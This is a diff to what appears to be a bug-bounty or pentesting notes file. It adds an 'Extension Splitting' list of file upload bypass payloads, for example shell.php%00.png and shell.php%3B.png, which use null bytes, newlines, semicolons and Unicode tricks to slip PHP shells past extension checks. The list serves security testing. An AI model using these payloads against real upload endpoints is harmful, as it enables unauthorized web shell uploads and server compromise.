@@ -785,6 +785,19 @@ From a user perspective, access controls can be divided into the following categ
 - [ ] Where is data stored?
   - [s3 perms](#abusing-s3-bucket-permissions)
   - [GCS perms](#google-cloud-storage-bucket)
+  
+**Extension Splitting** [[Reference](https://twitter.com/therceman/status/1597858216607481856)]
+- shell.php%00.png
+- shell.php%0A.png
+- shell.php\n.png
+- shell.php\u000a.png
+- shell.php\u560a.png
+- shell.php%E5%98%8A.png
+- shell.php;.png
+- shell.php%3B.png
+- shell.php\u003b.png
+- shell.php\u563b.png
+- shell.php%E5%98%BB.png
 
 **Resource**
 - [How I earned $500 by uploading a file: write-up of one of my first bug bounty](https://medium.com/@seeu-inspace/how-i-earned-500-by-uploading-a-file-write-up-of-one-of-my-first-bug-bounty-c174cf8ea553)
